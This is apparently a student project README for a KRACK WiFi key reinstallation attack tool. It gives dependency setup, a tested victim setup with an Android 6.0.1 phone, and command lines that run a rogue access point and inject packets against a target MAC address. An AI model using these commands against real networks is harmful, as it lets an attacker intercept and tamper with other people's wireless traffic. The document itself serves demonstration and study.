# Key Reinstallation Attack
## Presented by Ron, Afik, Shmuel & Avigael

### Demonstration:
![UnderAttack](media/demo.gif)

## Prerequisites

* Kali Linux, required dependencies:
  ```
  sudo apt update && sudo apt upgrade
  sudo apt install libnl-3-dev libnl-genl-3-dev pkg-config libssl-dev net-tools git sysfsutils python-scapy python-pycryptodome
  ```
* Python 2.7 - Install pip2 as well
* Disable WiFi and run:
  ```
  sudo rfkill unblock wifi
  ```

## Python Packages

```
pip install "scapy == 2.3.3"
pip install mitm_channel_based, pyfiglet, termcolor
```

## Tested Environment

1. `Attacking Computer`: Xiaomi Redmibook 14 
2. `OS`: Kali Linux Live CD
3. `Injection Network Adapter`: TP-Link TL-WN722N V1
4. `Eth Internet Adapter`: Samsung Galaxy S9 / iPhone 8 serves as an ethernet router via usb thethering
5. `Victim Host Network`: Samsung Galaxy S9 Hotspot
6. `Victim Device`: Samsung Galaxy J7 running Android 6.0.1

## Tool usage
1. First disable hardware encryption:
  ```
  sudo ./disable-hwcrypto.sh
  ```
2. Enter the krackattack folder and run the attack from this path:
  ```
  cd krackattack
  $sudo ./attack.py wlan1 wlan0 eth0 "Shabab" -t 88:83:22:82:93:CC
  ```
  or with PCAP output:
  ```
  sudo ./attack.py wlan1 wlan0 eth0 "Shabab" -t 88:83:22:82:93:CC -p "test.pcap"
  ```
  * `wlan1`: interface that listens and injects packets on the real channel
  * `wlan0`: interface that runs the Rogue AP
  * `eth0`: interface in which is provided internet access
  * `"Shabab"`: SSID of the target network
  * `-t 00:21:5d:ea:fe:be`: MAC address of the attacked device